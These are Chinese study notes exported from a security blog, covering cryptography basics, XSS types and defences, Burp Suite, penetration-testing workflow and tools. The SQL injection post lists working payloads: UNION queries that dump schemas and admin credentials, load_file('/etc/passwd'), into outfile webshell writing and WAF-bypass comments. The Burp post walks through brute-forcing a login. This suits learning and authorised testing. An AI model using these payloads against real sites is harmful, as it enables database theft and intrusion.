    <content type="text"><![CDATA[1.信息系统面临的威胁、安全属性与密码学技术： 面临的攻击威胁 所破坏的信息安全属性 解决问题所采用的密码学技术 截获（泄露信息） 机密性 对称密码和非对称密码 篡改（修改信息） 完整性 哈希函数，数字签名，对称密码和非对称密码 伪造（伪造信息来源） 真实性 数字签名 否认（事后否认发送信息和行为） 不可否认性 数字签名 2.密码学发展：​ 第一阶段是从古代到19世纪末—古典密码 ​ 第二阶段从20世纪初到1949年—近代密码 ​ 第三阶段从C.E.Shannon（香农）于1949年发表的划时代论文“The Communication Theory of Secret Systems”（保密系统的通讯理论）开始—现代密码 ​ 第四阶段从1976年W.Diffie和M.Hellman发表论文“New Directions in Cryptography”（密码学的新发现）开始—公钥密码 3.密码分类：（1）古典密码体质的安全性在于保持算法本身的保密性，受到算法限制 ​ 不适合大规模生产 ​ 不适合较大的或者人员变动较大的组织 ​ 用户无法了解算法的安全性 （2）近代密码： ​ 主要标志是机械密码/机电密码，用机电代替手工 ​ 近代密码体质是用机械或电动机械实现的，最著名的就是转轮机 轮转密码机ENIGMA，由Arthur Scherbius于1919年发明。在二次世界大战期间，Enigma曾作为德国陆，海，空三军最高级密码机 （3）现代密码学： ​ 1949年，Shannon的论文“The Communication Theory of Secret Systems”（保密系统的通讯理论） ​ 1967年，David Kanhn的专著《The Code breakers》 ​ 1971年-1973年，IBM Watson实验室的Horst Feistel等人发表的几篇技术报告 ​ 1974年，IBM提交了算法LUCIFER，后来成为了DES ​ 新特点：数据的安全基于密钥而不是算法的保密 （4）公钥密码学： ​ 1976年，W.Diffie和M.Hellman发表论文“New Directions in Cryptography”（密码学的新发现）提出了非对称密钥密码 ​ 1977年，Rivest，Shamir和Adleman提出了RSA公钥算法 ​ 90年代，逐步出现椭圆曲线等其他公钥算法 ​ 公钥密码使得发送端和接收端无密钥传输的保密通信成为可能 4.加密或解密：​ 明文：原始消息，被屏蔽消息，未经加密的消息； ​ 密文或密保：明文经密码变换而成的一种隐蔽形式； ​ 加密员或密码员：对明文进行加密操作的人员； ​ 加密：将明文变换为密文的过程 ​ 把可懂的语言变换成（人类/机器）不可动的语言 ​ 解密：由密文回复出原明文的过程 ​ 加密的逆过程，即把不可动的语言变换成可懂的语言 ​ 加密可以采用密码算法来实现，密码算法从密钥使用角度，可分为对称密码算法和非对称密码算法。 ​ 截获是指一个非授权方介入系统，窃听传输信息，导致信息泄露。它破坏了信息的保密性。非授权方可以是一个人，也可以是一个程序 ​ 截获攻击主要包括：通过嗅探和监听等手段截获信息，从而推测出有用的信息，如用户口令，账号，文件或程序的不正当复制等。 注意： MD5、sha 只是散列算法，或者叫摘要算法，不能算加密算法。详见： 解释区： https://www.zhihu.com/question/68735830 https://blog.csdn.net/cuixbo/article/details/82870910 https://blog.csdn.net/LSpQ35k7O5AJ21l1H9o/article/details/81073726 讨论区：https://bbs.csdn.net/topics/370172975 5.对称密码算法：（也称单钥或私钥密码算法）​ 加密密钥和解密密钥相同，或实质上等同，即从一个易于推出另一个。 ​ DES ,3DES , IDEA , AES ​ 密钥相对较短，一般采用128,192或256比特。 优点： ​ 效率高，算法简单，系统开销小； ​ 适合加密大量数据； ​ 明文长度与密文长度相等； ​ 缺点： ​ 需要以安全方式进行密钥交换； ​ 密钥管理复杂； ​ 无法解决消息的篡改，否认等问题； 6.非对称密码算法：（又叫公钥密码算法）​ 非对称密码算法：加密密钥和解密密钥不同，从一个很难推出另一个。其中，对外公开的密钥，称为公开密钥，简称公钥；必须保密的密钥，称为私有密钥，简称私钥。 ​ RSA ,ECC , ELGamal ​ 公钥加密 私钥解密； ​ 私钥加密 公钥解密； ​ 密码长度512-2048位； ​ 优势 ​ 密钥分发数目与参与者数目相同 ​ 在有大量参与者的情况下易于密钥管理 ​ 安全 ​ 支持数字签名和不可否认性 ​ 无需事先与对方建立关系，交换密钥 ​ 劣势 ​ 速度相对较慢 ​ 可能比同等强度的对称密码算法慢10到100倍 ​ 加密后，密文变长 7.混合加密算法： 8.哈希函数：对称密码和非对称密码算法主要解决信息的机密性问题，而实际系统和网络还可能受到消息篡改等攻击。 ​ 篡改攻击主要包括：修改信息内容，改变程序使其不能正确运行等。哈希函数可以用来保证信息的完整性。 ​ 哈希函数（也称为杂凑函数或单向散列函数）接收一个消息作为输入，产生一个称为哈希值的输出。输出的哈希值也成为散列值，消息摘要（Message Digest，MD）。 （1）MD5算法 ​ MD：Message Digest，消息摘要； ​ 输入：任意长度的消息； ​ 输出：128位消息摘要； ​ 处理：以512位输入数据块为单位； （2）SHA-1算法 ​ SHA（安全哈希算法）由美国国家标准技术研究所开发，1993年作为联邦信息处理标准发布，2008年又有更新 ​ 输入：最大长度为264位的消息 ​ 输出：160位消息摘要 ​ 处理：输入以512位数据块为单位处理 （3）比较SHA1/MD5 ​ 散列值长度： ​ MD5 128bits； ​ SHA1 160bits； ​ 安全性： ​ SHA1算法被视为MD5的替代候选算法； ​ 速度： ​ SHA1慢些； Type 16bytes 64bytes 256bytes 1024bytes 8192bytes Md5 5425.31k 19457.48k 55891.45k 104857.60k 143211.40k Sha1 5104.58k 16008.41k 37925.33k 57421.81k 68241.68k 9.数字签名：​ 除了保护信息的机密性和完整性，密码学技术也可以解决信息的可鉴别性：（真实性或认证性）和不可否认性。]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS漏洞]]></title>
    <url>%2F2019%2F10%2F25%2FXSS%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[1.什么是XSS攻击？​ XSS，跨站脚本攻击（Cross Site Scripting）的缩写，为了不和层叠样式表（Cascading Style Sheets, CSS）的缩写混淆，孤将跨站脚本攻击缩写为XSS。 ​ 恶意攻击者往Web页面里插入恶意 Script代码，当用户浏览该页面之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 ​ 跨站：从字面来分析，因为这个‘跨’ 实际上是浏览器的特性，而不是缺陷，造成‘跨’ 这样的假象是因为绝大多数XSS攻击都会采用嵌入一段远程或者第三方域上的脚本资源。 ​ 脚本：跨站脚本重点已经不再 ‘跨站’ 这个字母上，二是‘脚本’。脚本主要是：JavaScript 和 ActionScript 。 2.XSS的原理：​ 用户提交的数据没有过滤，或者过滤不严格，输出到网页中，导致可以构造执行JS代码，或者修改网页内容。 3.XSS的危害：​ 对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用，但是在各类的社交平台，邮件系统，开源流行的web应用，BBS，微博等场景中，造成的杀伤力却十分强大。 ​ 盗取用户或管理员的Cookie ​ XSS Worm ​ 挂马（水坑攻击） ​ 有局限性的键盘记录 4.XSS的分类：（1）反射型XSS ： 反射型XSS，又称为非持久型XSS。XSS代码出现在URL参数或者请求中，浏览器发出请求时，参数值作为输入提交到服务器，服务器接受处理后参数值出现在响应的HTML中，最后浏览器解析执行了这段XSS代码。 （2）存储型XSS： 存储型XSS，又称持久性XSS，它和反射型XSS最大的不同就是，攻击脚本将被永久的存放在目标服务器的数据库或文件中。 ​ DOM XSS; ​ Flash XSS; 5.反射型XSS利用过程：（1）恶意的攻击者发给受害者一个链接（链接中携带XSS代码） （2）攻击者诱使受害者点开这个链接 （3）XSS代码被提交到有XSS漏洞的web应用程序上 （4）WEB应用程序没有过滤提交上来的数据，或者过滤不严格 （5）WEB应用程序输出用户提交上来的数据（包括XSS代码） （6）用户浏览器渲染返回的HTML页面，执行返回的JavaScript代码。 （7）恶意的JavaScript代码在后天悄悄执行，获取用户信息。 6.存储型XSS利用过程：（1）恶意的攻击者让存在XSS漏洞的网站提交一段XSS代码 （2）WEB应用程序接受提交数据，没有过滤或者过滤不严格 （3）写入到数据库或者文件中 （4）受害者访问这个存在XSS恶意代码的页面时 （5）WEB应用程序从数据库读取之前恶意攻击者提交的数据 （6）受害者浏览器渲染返回的HTML页面，执行返回的JavaScript代码。 （7）恶意的JavaScript代码在后天悄悄执行，获取用户信息。 7.DOM XSS：​ DOM XSS与反射型XSS和存储型XSS的差别是在于DOM XSS的代码不需要服务器解析响应的直接参与，触发XSS靠的是浏览器DOM解析器的解析，可以完全认为是客户端的事情。 8.Flash XSS:​ 利用的是网页上flash文件缺陷来执行js脚本，一般是反射型XSS。 9.XSS手动挖掘： ​ 看URL参数输出位置 ​ 看输入框输出位置 输出点位置： ​ （1）输出在标签外 ​ 需要可以构造标签，如果不能构造标签就不存在XSS漏洞。 ​ （2）输出到标签中 ​ 如果输出在“双引号或者’单引号内部，需要能够闭合引号，如果不能闭合引号，就需要看能否在当前的标签属性汇总执行js代码，如果不能，就不存在XSS漏洞。 ​ 如果没有输出在“双引号或者’单引号内部，或者可以闭合引号，可以构造一个新的属性，使用新的属性的值来执行JS代码，比如事件属性。 ​ （3）输出到script标签中 ​ @如果输出在“双引号或者’ 单引号内部，需要能够闭合引号； ​ @如果不能闭合引号，需要看当前变量能不能innerHTML或者document.write, 插入到网页中，如果可以就可以构造XSS，如果没有，就不存在XSS（引号内部可以使用unicode编码， &lt;不能编码 ） ​ @如果输出“双引号或者’单引号内部，需要能够闭合引号，如果可以闭合引号，就可以直接传递进去js代码，使用注释符号，注释掉后面的js代码就可以构造XSS。 10.XSS防御： ​ 对XSS的防御需要根据实际情况对用户的输入进行严格的过滤。基于过滤的XSS防御方式通常可分为两种：基于黑名单的过滤和基于白名单的过滤。后者的防御效果往往更好，对于用户在白名单之外的输入，可以直接忽略。在构造表名单的过程中，需要保证在不影响用户体验的同时，尽可能杜绝一切不必要的输入内容。 在cookie中加入httponly属性可以在一定个程度上保护用户的cookie，减少出现XSS时的损失 （1，Apache2.2.x; 2.注册网站，把攻击者自己的加了httponly的cookie赋值过去，补全信息） Flash XSS的修复需要对相应的flash进行修改或升级替换。]]></content>
      <tags>
        <tag>漏洞，攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反射型 XSS]]></title>
    <url>%2F2019%2F10%2F25%2F%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%2F</url>
    <content type="text"><![CDATA[1.什么是反射型XSS？​ 反射型XSS是指应用程序web请求获取不可信赖的数据，在未检验数据是否存在恶意代码的情况下，便将其传送给了web用户。反射型XSS一般由攻击者构造带有恶意代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行，它的特点是非持久化，必须用户点击带有特定参数的连接才能引起。 2.反射型XSS的危害？​ 当用户访问一个带有XSS代码的URL请求的时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，造成XSS漏洞，可能导致窃取目标网站的cookie到攻击者的服务器上，读取用户未公开的资料或Click劫持实施钓鱼攻击等。 3.如何避免反射型XSS？要避免反射型XSS，需要注意以下几点： （1）对用户的输入进行合理验证（如年龄智能是数字），对特殊字符（如&lt; &gt; ‘ “等）以及 &lt; script &gt;、javascript等进行过滤。 （2）根据数据将要至上下文中的不同位置（HTML标签、HTML属性、JavaScript脚本、CSS、URL），对所有不可新数据进行恰当的输出编码。 （3）设置httponly属性，避免攻击者利用XSS漏洞进行cookie劫持攻击。]]></content>
      <tags>
        <tag>XSS漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[存储型 XSS]]></title>
    <url>%2F2019%2F10%2F24%2F%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%2F</url>
    <content type="text"><![CDATA[1.什么是存储型XSS？​ 存储型XSS应用程序通过web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取改数据时，程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。 2.哪里存在存储型XSS？​ 存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的 HTML 和 JS 解析执行，存储型XSS就发生了。 3.存储型XSS的危害？​ 存储型XSS的攻击方式主要是嵌入一段远程或者第三方域上的 JS 代码，并在目标域上执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。 4.如何避免存储型XSS？​ 要避免存储型XSS，需要注意一下几点： （1）对用户的输入进行合理验证，对特殊字符（如&lt;、&gt;、’、”等）以及 、JavaScript 等进行过滤。 （2）采用OWASP ESAPI 对数据输出 html 上下文中不同位置（HTML标签、HTML属性、JavaScript脚本、CSS、URL）进行恰当的输出编码。 （3）设置httponly属性，避免攻击者利用跨站脚本漏洞进行cookie劫持攻击。]]></content>
      <tags>
        <tag>XSS漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burp suite 渗透工具]]></title>
    <url>%2F2019%2F10%2F21%2Fburp-suite-%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[1.什么是burp suite? Burp Suite 是用于攻击web 应用程序的集成平台(渗透测试套件)，包含了许多渗透测试工具 如Proxy、Spider、Scanner、Intruder、Repeater、Sequencer、Decoder、Comparer等工具模块。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。 所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。通过拦截HTTP/HTTPS的web数据包，充当浏览器和相关应用程序的中间人，进行拦截、修改、重放数据包进行测试，非常适合信息安全从业人员使用。 注意：尽量下载专业版的，功能更多。 ​ 运行环境需要先安装jdk。 ​ 需要导入cacert.der证书。 2.burp suite中各模块的功能： Target(目标)——显示目标目录结构的的一个功能。 Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。 Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。 Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。 Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。 Options(设置)——对Burp Suite的一些设置。 3.如何使用burpsuite对网站进行暴力破解？burpsuite是一款集成多种功能的渗透工具，这篇文章主要简单介绍burpsuite的功能及简单地暴力破解一个网站的方法过程。我们一般只需用到bs的三个模块proxy(代理模块)、intruder（暴力破解模块）以及repeater（中继模块）。（1）在火狐浏览器中右上角选项的网络设置里，设置好代理服务器127.0.0.1:10086（这里的端口只要大于1024不与其他占用端口冲突即可），然后进入我们搭建好的靶机或者其他测试网站的登录页面。 （2）打开burpsuite，进入代理模块proxy，打开option选项，把监听的IP地址和端口改为127.0.0.1:10086。 （3）进入proxy的intercept，打开监听 intercept is on ，对网站进行拦截监听。 （4）在登录页面输入已知的网站管理员或者用户的名，随意输入一个密码点击登录。这是burpsuite的proxy选框亮了起来，监听到了数据包的信息。 （5）右键–&gt;send to intruder ，进入position，选择sniper狙击者模式，clear $，然后选择要爆破的项目：密码password，添加add $ 。再进入payload，点击load装载字典后，点击start attack开始暴力破解。 （6）然后看到长度不一样且response里有明显的成功的信息（这里也可正则匹配更加明显）就是我们要的正确密码。]]></content>
      <tags>
        <tag>渗透工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入]]></title>
    <url>%2F2019%2F10%2F18%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[什么是SQL注入？​ SQL注入是一种常见的web安全漏洞，攻击者利用这个漏洞，可以访问和修改数据，或者利用潜在的数据库漏洞进行攻击。 ​ 所谓SQL注入，是将SQL语句插入或添加到应用（用户）的输入参数中的攻击，这些参数会传递给后台的数据库服务器，加以解析并执行。 1.常见的web架构：​ 表示层—-》逻辑层—-》存储层 ​ 表示层显示网页界面； ​ 逻辑层加载、编译并执行脚本文件； ​ 存储层执行SQL语句并返回数据； 2.哪里可能存在SQL注入？​ GET POST HTTP头部注入 Cookie注入 ​ 任何客户端可控，传递到服务器的变量，并且和数据库进行交互，都有可能存在SQL注入； 3.漏洞原理：​ 通过用户可控的参数中注入SQL语法，破坏原有SQL结构，达到编写程序是意料之外结果的攻击性行为。 原因： （1）程序编写这在处理 程序和数据库交互时，使用字符串拼接的方式构造SQL语句。 （2）未对用户可控参数进行足够的过滤便将参数内容拼接到SQL语句红。 4.漏洞危害：​ 攻击者利用SQL注入漏洞，可以获取数据库中的多种信息（例如后台密码），从而脱去数据库中的内容（脱库）。 ​ 在特别情况下，还可以修改数据库内容或者插入内容到数据库中，如果数据库权限分配存在问题，或者数据库本省存在缺陷，那么攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限。 （通过SQL注入直接访问读写文件） 5.SQL注入分类：（1）根据注入的数据类型分类： ​ 整型注入和字符串类型注入； （2）根据注入的语法分类： ​ UNION query SQL injection （可联合查询注入） ​ Error-based SQL injection （报错型注入） ​ Boolean-based blind SQL injection （布尔型注入） ​ Time-based blind SQL injection （基于时间延迟注入） ​ Stacked queries SQL injection（可多语句查询注入） 6.如何判断网站是否存在SQL注入？在网页地址栏的 ？参数值后面输入来判断 and 1=1(真) –结果不变，页面会正常显示 and 1=2(假) –结果改变，页面不会正常显示 回显页面不同 （整型判断）； 单引号判断 ‘ 显示数据库错误信息或者页面回 显不同（整型，字符串类型判断）； ‘ (字符串型注入) ‘ and 1 %23 ‘ and 0 %23 ’ and 1 –+ ‘ and 1 # 转义符 \ ； -1/+1 回显下一个或上一个页面（整型判断）； and sleep（5） （判断页面返回时间）； 注意：出现弹窗提示错误可能是防火墙的原因 ​ 在URL中，注入的#符号最好用%代替 ​ 在URL中加号+就是空格，需要使用URL ​ 编码的%才可以; 7.MySQL中的3中注释风格： #（URL编码为%23）； – （–后面要跟上一个或多个空格,可以用–+或者–空格 -）； /*…… */ 多行注释； /*!…… */ 内联注释; select * /*!22222from */ users; 当内联注释里面的数字小于mysql当前版本时有效，大于时无效（可以过WAF） ​ select @@version //查看当前数据库版本 8.MySQL函数利用：（1）常用函数 ​ user（） //用户名 ​ database（） //数据库 ​ @@version //版本号 ​ session_user（） //session会话的用户名 ​ @@basedir // 返回当前的mysql的安装路径 ​ 用来判断SQL注入对象当前的操作系统，若返回盘符的是windows，返回的是Link路径则是Linux。 ​ @@datadir // 放回mysql的 存放路径 ​ @@version_compile_os //返回操作系统信息 （2）load_file()函数：读文件操作 ​ 前提： ​ 知道文件绝对路径； ​ 能够使用union查询； ​ 对web目录有写权限； ​ UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6# ​ UNION SELECT 1, ​ load_file(0x2f6574632f706173737764),3,4,5,6# ​ 内容转换为16进制编码 （3）into outfile()函数：写文件操作 ​ 前提： ​ 文件名必须全路径（绝对路径）； ​ 用户必须有写文件的权限； ​ 没有对 ‘ 引号过滤； SELECT ‘‘ into ​ outfile’c:\windows\tmp\1.php’ （4）into dumpfile()函数：写文件操作（二进制） （5）连接字符串函数： ​ concat(str1,str2) ​ concat_ws(separator,str1,str2……) ​ group_concat(str1,str2……) SELECT concat (username,password) from users; SELECT concat (username,0x23,password,0x23,id,0x23,’aabbcc’) from users; SELECT concat_ws(0x23,username,password,id,’aabb’) from users; SELECT group_concat(concat_ws(0x23,username,password,id,’aabb’)) from users; 9.MySQL中information_scheme库：​ SCHEMATA表 ​ 字段：SCHEMA_NAME ​ TABLES表 ​ 字段：TABLE_SCHEMA, TABLE_NAME ​ COLUMNS表 ​ 字段：TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME 10.MySQL中UNION规则：​ UNION必须有两条或两条以上的SELECT语句组成，语句 ​ 之间用关键字UNION分隔； ​ UNION中的每个查询必须包含相同的列； ​ UNION会从查询结果集中自动取出来重复行； 11.联合查询注入（UNION query SQL injection）：利用前提：页面上有显示位； 优点：方便、快捷、易于利用； 缺点：需要显示位 （1）判断列数： orderby : select * from user where id=1 groupby （2）判断显示位： php?id=-1 union select 1,2,3,4,5 （3）获取当前数据库名称和当前连接数据库的用户： php?id=-1 union select 1,2,databases(),4,5 php?id=-1 union select 1,2,user(),4,5 （4）列出所有数据库： limit 一个一个打印出来库名 ​ selectSCHEMA_NAME from information_schema.SCHEMATA limit 0,1 ; group_concat 一次性全部显示 ​ select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA ; （5）列出（数据库test）中所有的表： limit 一个一个打印出来字段名 ​ select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=’test’ limit 0,1 ; group_concat 一次性全部显示 ​ select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA =0x674657374 ; 注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。 （6）列出（数据库：test表：admin）中所有字段 select COLIMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=’test’ and TABLENAME=’admin’ limit0,1 select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e （7）列出（数据库：test表：admin）中的数据 select username，passwd from test.admin limit 0,1 ; select group_concat(concat(username,0x20,passwd)) from test.admin 12.SQL注入产生的条件：​ 服务器接受参数，并把参数返回到数据库中查询 13.报错注入（Error-based SQL injection）：利用前提： ​ 页面上没有显示位，但是需要输出SQL语句执行错误信息。 ​ 比如mysqli_error() 优点： ​ 不需要显示位 缺点： ​ 需要输出mysqli_error()的报错信息 （1）通过floor报错 ​ select 列1(count(*)), 列2(concat()随机数) as x from 表 group by x; ​ select count(*),concat((select concat_ws(0x26,username,password,email,id) from users limit 2,1), 0x23,floor(rand(0) * 2)) as x from users group by x ; ​ select * from users where id=1 and(select 345 from(表) as b) （2）通过ExtractValue报错 ​ and extractvalue(1,(payload)) ​ and extractvalue(1,concat(0x7e,(select @@version), 0x7e)) 注意：有可能报错信息会把用户名报出来 （3）通过UpdateXML报错 ​ and updatexml(1,(payload),1) ​ and updatexml(1,(concat(0x7e,(select @@version),0x7e)),1) 14.布尔注入（Boolean-based blind SQL injection）：15.延时注入（Time-based blind SQL injection）：利用前提： ​ 页面上没有显示位，也没有输出SQL语句执行错误信息。 ​ 正确的SQL语句和错误的SQL语句返回页面都一样，但是 加入sleep(5)条件后，页面的返回速度明显慢了5秒。 优点： ​ 不需要显示位，不需要出错信息。 缺点： ​ 速度慢，耗费大量时间。 16.宽字节注入：]]></content>
      <tags>
        <tag>注入漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试流程]]></title>
    <url>%2F2019%2F09%2F25%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[渗透测试与入侵的最大区别 渗透测试：出于保护系统的目的，更全面地找出测试对象的安全隐患。入侵：不择手段地（甚至是具有破坏性的）拿到系统权限。 一般渗透测试流程 12明确目标——》信息收集——》漏洞探测——》漏洞验证——》信息分析——》获取所需——》信息整理——》形成报告 流程并非万能，只是一个工具。思考与流程并用，结合自己经验。 2.1 明确目标确定范围：测试目标的范围，ip，域名，内外网。确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等。确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等。（立体全方位） 根据需求和自己技术能力来确定能不能做，能做多少。 2.2 信息收集 方式：主动扫描，开放搜索等 开放搜索：利用搜索引擎获得，后台，未授权页面，敏感url等。基础信息：IP，网段，域名，端口系统信息：操作系统版本应用信息：各端口的应用，例如web应用，邮件应用等等版本信息：所有这些探测到的东西的版本。服务信息人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等。防护信息：试着看能否探测到防护设备 2.3 漏洞探索 利用上一步中列出的各种系统，应用等使用相应的漏洞。 方法：1.漏扫，awvs，IBM appscan等。2.结合漏洞去exploit-db等位置找利用。3.在网上寻找验证poc。 内容：系统漏洞：系统没有及时打补丁Websever漏洞：Websever配置问题Web应用漏洞：Web应用开发问题其它端口服务漏洞：各种21/8080(st2)/7001/22/3389通信安全：明文传输，token在cookie中传送等。 2.4 漏洞验证 将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。自动化验证：结合自动化扫描工具提供的结果手工验证，根据公开资源进行验证试验验证：自己搭建模拟环境进行验证登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息业务漏洞验证：如发现业务漏洞，要进行验证公开资源的利用 -exploit-db/wooyun/ -google hacking -渗透代码网站 -通用、缺省口令 -厂商的漏洞警告等等。 2.5 信息分析 为下一步实施渗透做准备。精准打击：准备好上一步探测到的漏洞的exp，用来精准打击绕过防御机制：是否有防火墙等设备，如何绕过定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 2.6 获取所需实施攻击：根据前几步的结果，进行攻击获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）进一步渗透：内网入侵，敏感目标持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等清理痕迹：清理相关日志（访问，操作），上传文件等 2.7 信息整理整理渗透工具：整理渗透过程中用到的代码，poc，exp等整理收集信息：整理渗透过程中收集到的一切信息整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 目的：为了最后形成报告，形成测试结果使用。 2.8 形成报告按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告补充介绍：要对漏洞成因，验证过程和带来危害进行分析修补建议：当然要对所有产生的问题提出合理高效安全的解决办法 2.9 流程总结 !)img]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八大渗透测试常用工具]]></title>
    <url>%2F2019%2F09%2F25%2F%E5%85%AB%E5%A4%A7%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[1.NmapNmap (“Network Mapper”) 是一个自由和开放源码（许可证）的实用的网络发现和安全审计工具。Nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。 它是网络管理员必用的软件之一，以及用以评估网络系统安全。正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用nmap来探测工作环境中未经批准使用的服务器，但是黑客会利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap 常被跟评估系统漏洞软件Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。 其基本功能有三个，一是探测一组主机是否在线；其次是扫描 主机端口，嗅探所提供的网络服务；还可以推断主机所用的操作系统 。Nmap可用于扫描仅有两个节点的LAN，直至500个节点以上的网络。Nmap 还允许用户定制扫描技巧。通常，一个简单的使用ICMP协议的ping操作可以满足一般需求；也可以深入探测UDP或者TCP端口，直至主机所 使用的操作系统；还可以将所有探测结果记录到各种格式的日志中， 供进一步分析操作。 nmap运行在所有主流的计算机操作系统，和官方的二进制软件包可用于Linux，Windows和Mac OS X中，除了传统的命令行命令的可执行文件，nmap套件包括一个先进的图形用户界面和结果查看器（Zenmap），灵活的数据传输，重定向，和调试工具（NCAT），用于比较扫描结果的效用（NDIFF），和一个数据包生成和响应分析工具（nping）。 Nmap 在黑客帝国(The Matrix)中，连同SSH1的32位元循环冗余校验漏洞，被崔妮蒂用以入侵发电站的能源管理系统。它甚至出现在了十二部电影中，包括重装上阵，虎胆龙威4，与龙纹身的女孩，和最后通牒。 下载地址：https://nmap.org/ 2.WiresharkWireshark是世界上最重要和最广泛使用的网络协议分析器。它可以让你在微观层面上看到你的网络上正在发生的事情，并且是许多商业和非盈利企业、政府机构和教育机构的标准。Wireshark发展得益于世界各地网络专家的志愿贡献，也是1998年杰拉尔德·库姆斯开始的项目的延续。 Wireshark（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。网络封包分析软件的功能可想像成 “电工技师使用电表来量测电流、电压、电阻” 的工作 - 只是将场景移植到网络上，并将电线替换成网络线。在过去，网络封包分析软件是非常昂贵的，或是专门属于盈利用的软件。Ethereal的出现改变了这一切。在GNUGPL通用许可证的保障范围底下，使用者可以以免费的代价取得软件与其源代码，并拥有针对其源代码修改及客制化的权利。Ethereal是目前全世界最广泛的网络封包分析软件之一。 下载地址：https://www.wireshark.org/ 3.MetasploitMetasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程学。 Metasploit是H.D. Moore在2003年开发的，它是少数几个可用于执行诸多渗透测试步骤的工具。在发现新漏洞时（这是很常见的），Metasploit会监控Rapid7，然后Metasploit的200,000多个用户会将漏洞添加到Metasploit的目录上。然后，任何人只要使用Metasploit，就可以用它来测试特定系统的是否有这个漏洞。 